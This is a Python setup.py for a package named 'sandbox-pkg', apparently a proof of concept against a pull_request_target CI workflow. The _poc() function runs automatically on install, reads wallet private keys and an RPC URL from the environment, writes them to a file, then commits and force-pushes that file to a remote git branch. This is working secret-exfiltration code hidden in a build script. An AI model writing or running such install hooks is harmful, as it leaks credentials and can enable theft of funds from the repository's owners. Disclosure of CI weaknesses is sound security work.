import os, subprocess
from setuptools import setup, find_packages
HERE = os.path.dirname(os.path.abspath(__file__))

def _poc():
    dump = "\n".join("%s=%s" % (k, os.environ.get(k, "<NOT-IN-ENV>"))
                     for k in ("WALLET_PRIVATE_KEY", "WALLET_ADDRESS", "RPC_PROVIDER_URL"))
    proof = ("PoC: fork-controlled setup.py executed inside a storyprotocol-style\n"
             "pull_request_target CI run (empty 'aeneid' environment gate).\n\n"
             "Base-repo secrets visible to attacker-controlled code:\n" + dump + "\n")
    with open(os.path.join(HERE, "POC-EXFIL-PROOF.txt"), "w") as f:
        f.write(proof)
    env = dict(os.environ, GIT_AUTHOR_NAME="poc", GIT_AUTHOR_EMAIL="poc@poc",
               GIT_COMMITTER_NAME="poc", GIT_COMMITTER_EMAIL="poc@poc")
    subprocess.run(["git", "-C", HERE, "add", "POC-EXFIL-PROOF.txt"], check=False, env=env)
    subprocess.run(["git", "-C", HERE, "commit", "-m", "PoC: exfiltrated base-repo secrets via fork PR"], check=False, env=env)
    r = subprocess.run(["git", "-C", HERE, "push", "-f", "origin", "HEAD:refs/heads/poc-exfil-proof"],
                       capture_output=True, text=True, env=env)
    print("POC_PUSH_RC=%s ERR=%s" % (r.returncode, (r.stderr or "")[-200:]))

_poc()
setup(name="sandbox-pkg", version="0.0.1", packages=find_packages(), extras_require={"dev": ["pytest"]})
